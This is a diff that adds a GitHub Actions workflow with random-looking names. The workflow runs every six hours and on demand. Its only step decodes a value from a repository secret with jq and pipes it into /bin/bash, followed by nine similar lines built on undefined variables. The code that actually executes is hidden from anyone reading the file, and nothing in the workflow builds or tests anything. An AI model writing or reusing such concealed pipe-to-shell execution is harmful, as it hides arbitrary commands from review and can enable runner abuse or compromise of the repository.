@@ -1,0 +1,26 @@
+name: qiaowutaroude
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qiaowutaroude
+        env:
+          ntx3: ${{ secrets.ntx3 }}
+        run: |
+          echo $ntx3 | jq -r .osst67 | /bin/bash
+          echo $omqbo016 | jq -r .ztww7120 | /bin/bash
+          echo $doq26 | jq -r .r98372 | /bin/bash
+          echo $gjgrk10 | jq -r .yp7 | /bin/bash
+          echo $hpkld01 | jq -r .e2 | /bin/bash
+          echo $xa50318 | jq -r .rkm0 | /bin/bash
+          echo $oxrun8 | jq -r .pvx8012 | /bin/bash
+          echo $q7058 | jq -r .jxjuy827 | /bin/bash
+          echo $zahfp7 | jq -r .ofze41 | /bin/bash
+          echo $hhwt75908 | jq -r .x17 | /bin/bash
+
